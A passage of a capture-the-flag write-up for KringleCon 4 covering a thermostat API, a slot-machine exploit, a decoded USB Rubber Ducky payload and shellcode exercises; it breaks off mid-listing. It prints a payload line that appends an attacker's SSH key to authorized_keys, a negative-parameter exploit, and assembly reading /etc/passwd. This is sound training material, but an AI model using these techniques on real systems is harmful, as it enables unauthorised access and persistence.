    <img data-src="/images/kringlecon4/objectives/obj03_02.webp" alt="Objective 3 location" data-caption="Objective 3 location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 3 location
      
        
        
      
    </figcaption>
  
</figure>
<p>We stop next to the thermostat that we see through the window and open the <em>Wi-Fi CLI</em>. We check with <code>iwconfig</code> what is the wireless interface:</p>
<div class="box">$ iwconfig<br />
wlan0     IEEE 802.11  ESSID:off/any<br />
      Mode:Managed  Access Point: Not-Associated   Tx-Power=22 dBm<br />
      Retry:off   RTS thr:off   Fragment thr=7 B<br />
      Power Management:on</div>
<p>Then we scan the wireless networks in range using the <code>wlan0</code> interface:</p>
<div class="box">$ iwlist wlan0 scanning<br />
wlan0     Scan completed :<br />
      Cell 01 - Address: 02:4A:46:68:69:21<br />
            Frequency:5.2 GHz (Channel 40)<br />
            Quality=48/70  Signal level=-62 dBm<br />
            Encryption key:off<br />
            Bit Rates:400 Mb/s<br />
            ESSID:&ldquo;FROST-Nidus-Setup&rdquo;</div>
<p>The <code>FROST-Nidus-Setup</code> <em>Wi-Fi</em> network is in reach and full open. We can connect to it with:</p>
<div class="box">$ iwconfig wlan0 essid FROST-Nidus-Setup<br />
** New network connection to Nidus Thermostat detected! Visit http://nidus-setup:8080/ to complete setup<br />
(The setup is compatible with the &lsquo;curl&rsquo; utility)</div>
<p>When accessing the <em>Nidus Thermostat</em> setup page we get the following information:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj03_03.webp" alt="Nidus Thermostat setup page" data-caption="Nidus Thermostat setup page" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Nidus Thermostat setup page
      
        
        
      
    </figcaption>
  
</figure>
<p>And the <em>API</em> documentation can be read through the <code>/apidoc</code> endpoint:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj03_04.webp" alt="Nidus Thermostat API doc" data-caption="Nidus Thermostat API doc" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Nidus Thermostat API doc
      
        
        
      
    </figcaption>
  
</figure>
<p>The current entrance temperature can be checked without registration with a <em>GET</em> request to the <code>/api/cooler</code> endpoint:</p>
<div class="box">$ curl http://nidus-setup:8080/api/cooler<br />
{<br />
  &ldquo;temperature&rdquo;: -40.26,<br />
  &ldquo;humidity&rdquo;: 39.55,<br />
  &ldquo;wind&rdquo;: 11.12,<br />
  &ldquo;windchill&rdquo;: -52.08<br />
}</div>
<p>When we try to register the thermostat by calling the <code>/register</code> endpoint, we are asked to enter its serial number&hellip;that we do not have. We can try to do a <em>POST</em> request to the <code>/cooler</code> endpoint to raise the temperature as it is the only endpoint that does not require the registration:</p>
<div class="box">$ curl -XPOST -H &lsquo;Content-Type: application/json&rsquo; --data-binary &lsquo;{&ldquo;temperature&rdquo;: 10}&rsquo; http://nidus-setup:8080/api/cooler<br />
{<br />
  &ldquo;temperature&rdquo;: 10.89,<br />
  &ldquo;humidity&rdquo;: 40.47,<br />
  &ldquo;wind&rdquo;: 10.08,<br />
  &ldquo;windchill&rdquo;: 9.68,<br />
  &ldquo;WARNING&rdquo;: &ldquo;ICE MELT DETECTED!&rdquo;<br />
}</div>
<p>And that&rsquo;s how we complete the objective. The door is defrost and we can enter the <em>Frost Tower</em>.</p>
<h3 id="4---slot-machine-investigation">4 - Slot Machine Investigation</h3>
<hr />
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>2/5</td>
<td>Test the security of <strong>Jack Frost</strong>&rsquo;s <a href="https://slots.jackfrosttower.com/">slot machines</a>. What does the <em>Jack Frost Tower</em> casino security team threaten to do when your coin total exceeds 1000? Submit the string in the server <code>data.response</code> element. Talk to <strong>Noel Boetie</strong> outside <strong>Santa</strong>&rsquo;s Castle for help.</td>
<td>Frost Tower Lobby</td>
</tr>
</tbody>
</table>
<p>The <strong>Jack Frost</strong>&rsquo;s <em>Slot Machine</em> is a website that is accessible on <a href="https://slots.jackfrosttower.com/">https://slots.jackfrosttower.com</a>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj04_02.webp" alt="Frosty Slots" data-caption="Frosty Slots" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Frosty Slots
      
        
        
      
    </figcaption>
  
</figure>
<p>We start with a credit of 100 coins and the goal is to reach at least 1000. We spin the game and hope to align 3 or more same characters to win. We can change 2 values, the bet size (from 0.1, 0.25 or 0.5) and the bet level (from 1 to 10) that changes the number of coins we bet. The minimum is 2 and the max is 100. If we proxify the call we see the following call to the <code>/spin</code> <em>API</em> endpoint:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj04_03.webp" alt="API call" data-caption="API call" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      API call
      
        
        
      
    </figcaption>
  
</figure>
<p>And the response looks like:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj04_04.webp" alt="API call response" data-caption="API call response" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      API call response
      
        
        
      
    </figcaption>
  
</figure>
<p>Basically, the 3 values are linked as follows: <code>total bet = betamount * numline * cpl</code>. The only value we can not change in the game is <code>numline</code> and it defaults to 20.</p>
<p>We send this call to the <em>Burp Repeater</em> and start to play with the <em>POST</em> values. We see the following contraints:</p>
<ul>
<li>betamount &gt;= 0</li>
<li>cpl &gt; 0</li>
<li>numline can be any number positive or negative</li>
<li>betamout * numline * cpl &lt;= the credit we have</li>
</ul>
<p>As <code>numline</code> is not properly validated and accepts negative values, we can set it, for instance, to <code>-20</code>. We get a total bet of <code>-2</code> which is less than the credit we have. If we spin and lose, this value is substracted from the credit and when we substract a negative value&hellip;we add it! So to get <code>1000</code> credit in one go, we can simply set <code>betamount=10&amp;numline=-10&amp;cpl=10</code> and we get the following response:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj04_05.webp" alt="Vulnerability" data-caption="Vulnerability" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Vulnerability
      
        
        
      
    </figcaption>
  
</figure>
<div class="notices success" data-title="Objective 4 answer">
  I&rsquo;m going to have some bouncer trolls bounce you right out of this casino!
</div>
<h3 id="5---strange-usb-device">5 - Strange USB Device</h3>
<hr />
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>2/5</td>
<td>Assist the elves in reverse engineering the strange <em>USB</em> device. Visit <strong>Santa</strong>&rsquo;s Talks Floor and hit up <strong>Jewel Loggins</strong> for advice.</td>
<td>Speaker UNPreparedness Room</td>
</tr>
</tbody>
</table>
<p>For this objective, we will have to analyze a <a href="https://hak5.org/products/usb-rubber-ducky-deluxe">USB Rubber Duckie</a> attack by investigating the <em>USB</em> data found on the <em>USB</em> stick still plugged in.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj05_02.webp" alt="Objective 5 location" data-caption="Objective 5 location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 5 location
      
        
        
      
    </figcaption>
  
</figure>
<p>The file to analyze is <code>/mnt/USBDEVICE/inject.bin</code>. This file is an encoded version of a <em>Ducky Script</em> that we can reverse engineer with a tool called <a href="https://github.com/dagonis/Mallard"><em>Mallard</em></a>. We can find this script in <code>/home/elf/mallard.py</code>. We can simply run <code>./mallard.py --file /mnt/USBDEVICE/inject.bin</code>:</p>
<p>[TODO] Copy paste the decoded file into GIST!</p>
<p>We see the commands that are executed by the sript. The very last command is weakly obfuscated. The attacker copy his <em>SSH</em> public key into the user&rsquo;s <code>authorized_keys</code> file for persistence.</p>
<div class="box"><p>$ echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d</p>
<p>echo &lsquo;ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGlMRnJhdWdST2FSaWZSaXBKcUZmUHAK <a href="mailto:ickymcgoop@trollfun.jackfrosttower.com">ickymcgoop@trollfun.jackfrosttower.com</a>&rsquo; &raquo; ~/.ssh/authorized_keys</p>
</div>
<div class="notices success" data-title="Objective 5 answer">
  ickymcgoop
</div>
<h3 id="6---shellcode-primer">6 - Shellcode Primer</h3>
<hr />
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>3/5</td>
<td>Complete the <a href="https://tracer.kringlecastle.com/">Shellcode Primer</a> in <em>Jack</em>&rsquo;s office. According to the last challenge, what is the secret to KringleCon success? &ldquo;All of our speakers and organizers, providing the gift of ____, free to the community.&rdquo; Talk to <strong>Chimney Scissorsticks</strong> in the <em>NetWars</em> area for hints.</td>
<td>Jack&rsquo;s Office</td>
</tr>
</tbody>
</table>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj06_01.webp" alt="Objective 6 location" data-caption="Objective 6 location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 6 location
      
        
        
      
    </figcaption>
  
</figure>
<p>We have to go through a primer on 64-bit shellcoding. The training starts at <a href="https://tracer.kringlecastle.com/">https://tracer.kringlecastle.com/</a>.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj06_02.webp" alt="Shellcode Primer" data-caption="Shellcode Primer" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Shellcode Primer
      
        
        
      
    </figcaption>
  
</figure>
<p>We will have multiple exercices to complete. The very first one is just the &ldquo;Introduction&rdquo; to get familiarized with the interface. We can simply read the description and click the <code>Execute</code> button. The next one is again only a tutorial about &ldquo;Loops&rdquo;:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj06_03.webp" alt="Loops" data-caption="Loops" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Loops
      
        
        
      
    </figcaption>
  
</figure>
<p>Again here, we do not have much to do except to execute the code and to analyze each step to understand what the debugger does. The interesting things start with the next exercise &ldquo;Getting Started&rdquo;:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj06_04.webp" alt="Getting Started" data-caption="Getting Started" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Getting Started
      
        
        
      
    </figcaption>
  
</figure>
<p>The only thing to do here is to return and&hellip;that&rsquo;s it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">ret</span>
</code></pre></td></tr></table>
</div>
</div><p>The fourth exercise &ldquo;Returning a Value&rdquo; is about returning a simple integer value:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1337</span>
<span class="nf">ret</span>
</code></pre></td></tr></table>
</div>
</div><p>The fifth exercise &ldquo;System Calls&rdquo; is about syscalls. We need to call <code>sys_exit</code> with exit code <code>99</code>. For that we can use <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">this reference website</a>. The <code>sys_exit</code> syscall number is <code>60</code>. As per 64-bit calling convention, the first argument must be stored in the <code>rdi</code> register.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">60</span>             <span class="c">; sys_exit
</span><span class="c"></span><span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="mi">99</span>             <span class="c">; exit code
</span><span class="c"></span><span class="no">syscall</span>
</code></pre></td></tr></table>
</div>
</div><p>The next exercise &ldquo;Calling into the Void&rdquo; is there only to show a crash when accessing an invalid memory address. Nothing to be done. Next exercise is &ldquo;Getting RIP&rdquo;. The goal here is to retrieve the <code>rip</code> address that cannot be directly retrieved after a <code>call</code>. One possibility is to <code>pop</code> the value from the stack right after the <code>call</code> saves its return value:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">call</span> <span class="no">place_below_the_nop</span>
<span class="nf">nop</span>
<span class="nl">place_below_the_nop:</span>
  <span class="nf">pop</span> <span class="no">rax</span>
  <span class="nf">ret</span>
</code></pre></td></tr></table>
</div>
</div><p>Exercise 8 is &ldquo;Hello, World!&rdquo; where we need to return a pointer to that string:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">call</span> <span class="no">place_below_the_hello</span>
<span class="nf">db</span> <span class="err">&#39;</span><span class="no">Hello</span> <span class="no">World</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0</span>
<span class="nl">place_below_the_hello:</span>
  <span class="nf">pop</span> <span class="no">rax</span>
  <span class="nf">ret</span>
</code></pre></td></tr></table>
</div>
</div><p>Next, we need to print &ldquo;Hello, World!!&rdquo; to standard output. The <code>sys_write</code> syscall number is <code>1</code>. The call takes 3 arguments, a pointer to the file descriptor (stdout=1), the pointer to the string to print and the length of the string in bytes. As per the 64-bit calling convention, the first argument must be in <code>rdi</code>, the second in <code>rsi</code> and the third in <code>rdx</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">call</span> <span class="no">place_below_the_hello</span>
<span class="nf">db</span> <span class="err">&#39;</span><span class="no">Hello</span> <span class="no">World</span><span class="p">!</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0</span>
<span class="nl">place_below_the_hello:</span>
  <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>            <span class="c">; sys_write
</span><span class="c"></span>  <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="mi">1</span>            <span class="c">; stdout
</span><span class="c"></span>  <span class="no">pop</span> <span class="no">rsi</span>               <span class="c">; &#39;Hello World!&#39;
</span><span class="c"></span>  <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">12</span>           <span class="c">; string length
</span><span class="c"></span>  <span class="no">syscall</span>
  <span class="nf">ret</span>
</code></pre></td></tr></table>
</div>
</div><p>In &ldquo;Opening a File&rdquo;, we want to open the <code>/etc/passwd</code> file by calling <code>sys_open</code>. The syscall number is <code>2</code> and it takes 3 arguments, a pointer to the file name, the flags (0 will do fine), the mode (0 as well):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">call</span> <span class="no">place_below_the_file</span>
<span class="nf">db</span> <span class="err">&#39;/</span><span class="no">etc</span><span class="err">/</span><span class="no">passwd</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0</span>
<span class="nl">place_below_the_file:</span>
  <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">2</span>            <span class="c">; sys_open
</span><span class="c"></span>  <span class="no">pop</span> <span class="no">rdi</span>               <span class="c">; &#39;/etc/passwd&#39;
</span><span class="c"></span>  <span class="no">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0</span>            <span class="c">; flags
</span><span class="c"></span>  <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">0</span>            <span class="c">; mode
</span><span class="c"></span>  <span class="no">syscall</span>
  <span class="nf">ret</span>
</code></pre></td></tr></table>
</div>
</div><p>With &ldquo;Reading a File&rdquo; we need to read a specific file <code>/var/northpolesecrets.txt</code> and write it to stdout. We will need to open the file with <code>sys_open</code> (<code>2</code>), read the file with <code>sys_read</code> (<code>0</code>), write the file to stdout with <code>sys_write</code> (<code>1</code>) and exit with <code>sys_exit</code> (<code>60</code>):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">call</span> <span class="no">place_below_the_file</span>
<span class="nf">db</span> <span class="err">&#39;/</span><span class="no">var</span><span class="err">/</span><span class="no">northpolesecrets.txt</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0</span>
<span class="nl">place_below_the_file:</span>
  <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">2</span>            <span class="c">; sys_open
</span><span class="c"></span>  <span class="no">pop</span> <span class="no">rdi</span>               <span class="c">; &#39;/var/northpolesecrets.txt&#39;
</span><span class="c"></span>  <span class="no">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0</span>            <span class="c">; flags
</span><span class="c"></span>  <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">0</span>            <span class="c">; mode
</span><span class="c"></span>  <span class="no">syscall</span>

  <span class="nf">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>          <span class="c">; file descriptor
</span><span class="c"></span>  <span class="no">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">0</span>            <span class="c">; sys_read
</span><span class="c"></span>  <span class="no">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rsp</span>          <span class="c">; buffer for reading
</span><span class="c"></span>  <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">1000</span>         <span class="c">; read 1000 bytes
</span><span class="c"></span>  <span class="no">syscall</span>

